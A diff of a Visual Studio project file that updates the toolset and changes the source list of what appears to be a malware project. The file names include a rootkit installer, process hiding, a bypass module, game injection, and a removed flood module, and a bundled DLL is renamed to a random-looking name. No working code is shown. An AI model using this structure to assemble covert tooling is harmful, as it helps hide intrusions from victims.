@@ -30,13 +30,13 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
-    <PlatformToolset>v142</PlatformToolset>
+    <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
-    <PlatformToolset>v142</PlatformToolset>
+    <PlatformToolset>v143</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>MultiByte</CharacterSet>
     <UseOfMfc>false</UseOfMfc>
@@ -44,13 +44,13 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
-    <PlatformToolset>v142</PlatformToolset>
+    <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
-    <PlatformToolset>v142</PlatformToolset>
+    <PlatformToolset>v143</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
@@ -156,26 +156,22 @@
     <ClCompile Include="Bypass.cpp" />
     <ClCompile Include="Connect.cpp" />
     <ClCompile Include="control.cpp" />
+    <ClCompile Include="CSGO_Injection.cpp" />
     <ClCompile Include="Encryption.cpp" />
     <ClCompile Include="file_operation.cpp" />
-    <ClCompile Include="Flood.cpp" />
     <ClCompile Include="Funtions.cpp" />
     <ClCompile Include="hand file\Encoding\URLEncoding.cpp" />
     <ClCompile Include="hand file\r77\r77 hand\Install.cpp" />
     <ClCompile Include="hand file\r77\r77 hand\r77api.cpp" />
-    <ClCompile Include="hand file\Socket\Sockets.cpp" />
     <ClCompile Include="kernel.cpp" />
     <ClCompile Include="search_regedit_information.cpp" />
     <ClCompile Include="Socket_Tcp_Server.cpp" />
-    <ClCompile Include="uoload_or_download-function.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="API.h" />
-    <ClInclude Include="hand file\Encoding\URLEncoding.h" />
     <ClInclude Include="hand file\r77\r77 hand\Install.h" />
     <ClInclude Include="hand file\r77\r77 hand\ntdll.h" />
     <ClInclude Include="hand file\r77\r77 hand\r77api.h" />
-    <ClInclude Include="hand file\Socket\Sockets.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="resource\Encryption\aes_pre.h" />
     <ClInclude Include="resource\Encryption\aes_transfer.h" />
@@ -186,7 +182,7 @@
     <ResourceCompile Include="0x7E9FB-net.rc" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="file\dxgi.dll" />
+    <None Include="file\lFcGdB.dll" />
     <None Include="file\libuv.dll" />
     <None Include="file\ProcessHide.dll" />
     <None Include="hand file\r77\exe file\InstallStager.exe" />
